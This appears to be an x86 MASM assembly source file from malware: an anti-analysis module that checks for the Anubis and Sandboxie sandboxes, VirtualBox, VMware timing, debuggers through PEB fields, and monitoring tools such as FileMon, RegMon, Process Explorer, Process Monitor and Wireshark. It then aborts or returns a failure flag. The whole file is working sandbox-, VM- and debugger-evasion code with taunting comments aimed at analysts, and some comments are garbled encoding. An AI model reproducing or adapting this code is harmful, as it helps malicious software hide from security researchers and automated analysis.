
WiresharkWndEnumProc proc eHandle :DWORD, y :DWORD
      LOCAL   txtName[256]:BYTE
      LOCAL   clName[256] :BYTE

      GetClassName, eHandle, addr clName, sizeof clName
      GetWindowText, eHandle, addr txtName, sizeof txtName
      
      lstrcmpi, addr WiresharkWinClass, addr clName
      .if     eax == 0
              lstrlen, addr txtName
              push    eax
              push    sizeof WiresharkWinText
              lea     eax, txtName
              push    eax
              push    offset WiresharkWinText
              call    strpos
              .if     eax != 0
                      mov     ws_detected, TRUE
              .endif
      .endif
      
      mov     eax, TRUE
      ret
WiresharkWndEnumProc endp

CheckAntis proc
      ; Check Anubis [QEMU]
      cmp     byte ptr [anti_anubis], 0
      je      dont_check_anubis
      call    Check_Anubis ; fuck yourself inside
    dont_check_anubis:
    
      ; Check Sandboxie
      cmp     byte ptr [anti_sbie], 0
      je      dont_check_sbie
      call    Check_SBIE ; fuck yourself inside
    dont_check_sbie:
      
      ; Check VBox
      cmp     byte ptr [anti_vbox], 0
      je      dont_check_vbox
      call    Check_VBox ; fuck yourself inside
    dont_check_vbox:
    
      ; Check VMware
      cmp     byte ptr [anti_vm], 0
      je      dont_check_vm
      rdtsc
      xor     ecx, ecx
      add     ecx, eax
      rdtsc 
      sub     eax, ecx
      cmp     eax, 0FFh
      jg      smth_detected
    dont_check_vm:
    
      ; Check Debuggers
      cmp     byte ptr [anti_dbg], 0
      je      dont_check_dbg
      call    DbgCheck ; fuck yourself here :D
    dont_check_dbg:
    
      ; Check FileMon
      cmp     byte ptr [anti_filemon], 0
      je      dont_check_filemon
      invoke  IsExeRunning, offset FileMonExeName
      test    eax, eax
      jne     dont_check_filemon
      jmp     smth_detected
    dont_check_filemon:
    
      ; Check RegMon
      cmp     byte ptr [anti_regmon], 0
      je      dont_check_regmon
      invoke  IsExeRunning, offset RegMonExeName
      test    eax, eax
      jne     dont_check_regmon
      jmp     smth_detected
    dont_check_regmon:
    
      ; Check Process Explorer
      cmp     byte ptr [anti_procexp], 0
      je      dont_check_procexp
      FindWindow, offset ProcExpWndClass, 0
      test    eax, eax
      jne     smth_detected
    dont_check_procexp:
    
      ; Check Process Monitor
      cmp     byte ptr [anti_procmon], 0
      je      dont_check_procmon
      FindWindow, offset ProcMonWndClass, 0
      test    eax, eax
      jne     smth_detected
    dont_check_procmon:
      
      ; Check Wireshark
      cmp     byte ptr [anti_ws], 0
      je      dont_check_ws
      
      mov     ws_detected, FALSE
      EnumWindows, addr WiresharkWndEnumProc,0
      mov     eax, ws_detected
      test    eax, eax
      jne     smth_detected
      
      
    dont_check_ws:
      
      ; Check processes
      cmp     dword ptr [anti_StructSize], 0
      je      dont_check_processes
      call    Anti_Enum_Routine
    dont_check_processes:
    
      ; Nothing found
      mov     eax, esp
      ret
      ; Some shit found
    smth_detected:
      xor     eax, eax
      ret
CheckAntis endp

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;������� xIsDebuggerPresent 
;�������� �� �������
;�������� ���� Peb.BeingDebugger (1 - ���� ��� ����������, ����� 0) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xIsDebuggerPresent:
      assume  fs : nothing
      mov     eax, dword ptr fs:[30h]
      cmp     byte ptr [eax+02], 0
      je      xidpret
      jmp     FatalError
    xidpret:
      ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� ����� xIsDebuggerPresent 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� xNtGlobalFlag 
;�������� �� �������
;�������� ���� Peb.NtGlobalFlag �� ������� ������ ������ �� ������ �������:
;   FLG_HEAP_ENABLE_TAIL_CHECK   (0x10) 
;   FLG_HEAP_ENABLE_FREE_CHECK   (0x20)  
;   FLG_HEAP_VALIDATE_PARAMETERS (0x40)
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xNtGlobalFlag:
      assume  fs : nothing
      mov     eax, dword ptr fs:[30h]
      test    dword ptr [eax+68h], 70h
      je      xngfret
      jmp     FatalError
    xngfret:
      ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� xNtGlobalFlag  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 

DbgCheck proc
      call    xIsDebuggerPresent
      call    xNtGlobalFlag
      ret
DbgCheck endp

Check_SBIE proc
      GetModuleHandle, addr SbieDll
      jz      sbie_NotDetected
      jmp     FatalError
    sbie_NotDetected:
      ret
Check_SBIE endp

Check_VBox proc
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr bios_ver_path, addr bios_ver_name, addr vbox_buf1, sizeof vbox_buf1, REG_READ_A
      test    eax, eax
      je      vbox_shitted_pants
      
      mov     eax, dword ptr [vbox_buf1]
      cmp     eax, 584F4256h ; "VBOX"
      jne     no_vbox_now
      jmp     FatalError
      
    no_vbox_now:
    vbox_shitted_pants:
      ret
Check_VBox endp

Check_Anubis proc
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr bios_ver_path, addr bios_ver_name, addr anubis_buf1, sizeof anubis_buf1, REG_READ_A
      test    eax, eax
      je      anubis_shitted_pants
      
      mov     eax, dword ptr [anubis_buf1]
      cmp     eax, 554D4551h ; "QEMU"
      jne     no_anubis_now
      jmp     FatalError
    no_anubis_now:
    anubis_shitted_pants:
      ret
Check_Anubis endp

Anti_Enum_Routine proc uses ebx
      mov     ebx, dword ptr [anti_hStruct]
      mov     ecx, dword ptr [ebx] ; count
      add     ebx, 4
    check_processes_lp:
      push    ecx
      
      invoke  IsExeRunning, ebx
      test    eax, eax
      jne     enum_noth_found
      jmp     FatalError
    enum_noth_found:
      
      lstrlenW, ebx
      ;imul    eax, eax, 2
      ;add     ebx, eax
      ;lea     ebx, [ebx+2]
      lea     ebx, [ebx+eax*2+2]
      
      pop     ecx
      dec     ecx
      jnz     check_processes_lp 
      ret
Anti_Enum_Routine endp
